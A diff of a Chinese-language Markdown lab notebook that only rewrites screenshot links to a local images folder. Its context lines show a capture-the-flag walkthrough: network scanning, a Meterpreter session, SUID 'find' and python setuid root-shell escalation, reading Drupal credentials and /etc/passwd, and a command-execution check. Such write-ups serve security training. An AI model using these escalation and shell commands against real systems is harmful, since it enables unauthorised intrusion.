@@ -10,7 +10,7 @@
 sudo nmap -sP 192.168.?.0/24
 ```
 
-![image-20250728165751044](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728165751044.png)
+![image-20250728165751044](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728165751044.png)
 
 ------
 
@@ -63,7 +63,7 @@ run
 [*] Meterpreter session 1 opened ...
 ```
 
-![image-20250728170041676](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728170041676.png)
+![image-20250728170041676](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728170041676.png)
 
 ### ✅ 第 6 步：提升交互性（获得 bash shell）
 
@@ -71,7 +71,7 @@ run
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![image-20250728170108510](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728170108510.png)
+![image-20250728170108510](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728170108510.png)
 
 ------
 
@@ -124,7 +124,7 @@ find . -exec /bin/sh -i \; -quit
 find /tmp -exec id \; -quit
 ```
 
-![image-20250728113459339](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728113459339.png)
+![image-20250728113459339](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728113459339.png)
 
 ### ✅ 修正 euid 与 uid 问题(flag5终极提权)
 
@@ -132,7 +132,7 @@ find /tmp -exec id \; -quit
 python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-![image-20250728171333112](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728171333112.png)
+![image-20250728171333112](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728171333112.png)
 
 ------
 
@@ -162,7 +162,7 @@ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 - **含义**：提示查找 Drupal 配置文件：`/var/www/html/sites/default/settings.php`
 
-![image-20250728171948087](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728171948087.png)
+![image-20250728171948087](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728171948087.png)
 
 ------
 
@@ -185,7 +185,7 @@ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
    * What can you do with these credentials?
   ```
 
-![image-20250728190234759](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728190234759.png)
+![image-20250728190234759](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728190234759.png)
 
 ------
 
@@ -222,9 +222,9 @@ SELECT nid, title FROM node;
 SELECT body_value FROM field_data_body WHERE entity_id = 2;
 ```
 
-![image-20250728174813082](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728174813082.png)
+![image-20250728174813082](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728174813082.png)
 
-![image-20250728175002363](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728175002363.png)
+![image-20250728175002363](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728175002363.png)
 
 ------
 
@@ -236,7 +236,7 @@ SELECT body_value FROM field_data_body WHERE entity_id = 2;
 cat /etc/passwd
 ```
 
-![image-20250728175239763](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728175239763.png)
+![image-20250728175239763](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728175239763.png)
 
 - 查找到特定用户目录下的 flag：
 
@@ -244,7 +244,7 @@ cat /etc/passwd
 cat /home/flag4/flag4.txt
 ```
 
-![image-20250728191407974](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728191407974.png)
+![image-20250728191407974](images/image-20250728191407974.png)
 
 ------
 
@@ -256,7 +256,7 @@ cat /home/flag4/flag4.txt
 cat /root/thefinalflag.txt
 ```
 
-![image-20250728190100534](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728190100534.png)
+![image-20250728190100534](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728190100534.png)
 
 
 
@@ -322,7 +322,7 @@ Wireshark 无法直接显示物理层的电信号，但通过 `Frame` 可以看�
   Frame Length: 130 bytes (1040 bits)
   ```
 
-  ![image-20250728192541180](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728192541180.png)
+  ![image-20250728192541180](images/image-20250728192541180.png)
 
 ------
 
@@ -352,7 +352,7 @@ Ethernet II, Src: VMware_fb:a4:29 (00:0c:29:fb:a4:29), Dst: VMware_fd:49:e8 (00:
   Ethertype: IPv4 (0x0800)
   ```
 
-  ![image-20250728192558706](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728192558706.png)
+  ![image-20250728192558706](images/image-20250728192558706.png)
 
 ------
 
@@ -382,7 +382,7 @@ Internet Protocol Version 4, Src: 192.168.126.128, Dst: 153.3.238.28
   Protocol: TCP (6)
   ```
 
-  ![image-20250728192619837](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728192619837.png)
+  ![image-20250728192619837](images/image-20250728192619837.png)
 
 ------
 
@@ -424,7 +424,7 @@ Transmission Control Protocol, Src Port: 38444, Dst Port: 80, Seq: 1, Ack: 1, Le
   76 字节
   ```
 
-  ![image-20250728192632280](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728192632280.png)
+  ![image-20250728192632280](images/image-20250728192632280.png)
 
 ------
 
@@ -452,7 +452,7 @@ Accept: */*
 - **Accept 类型**：`*/*`
 - **完整请求 URI**：`http://www.baidu.com/`
 
-![image-20250728192959272](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728192959272.png)
+![image-20250728192959272](images/image-20250728192959272.png)
 
 ------
 
@@ -504,7 +504,7 @@ pip install requests
 HOST="http://192.168.126.139"
 ```
 
-![image-20250728193639595](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728193639595.png)
+![image-20250728193639595](images/image-20250728193639595.png)
 
 ------
 
@@ -526,7 +526,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 说明你已经 **成功执行了 id 命令**，靶机存在漏洞。
 
-![image-20250728193825088](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250728193825088.png)
+![image-20250728193825088](images/image-20250728193825088.png)
 
 ------
 
@@ -578,7 +578,7 @@ sudo arp-scan -l
 
 > “我就是 192.168.126.130，我的 MAC 地址是 08:00:27:12:34:56。”
 
-![image-20250728102306984](file:///C:/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728102306984.png)
+![image-20250728102306984](images/%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250728102306984.png)
 
 ------
 
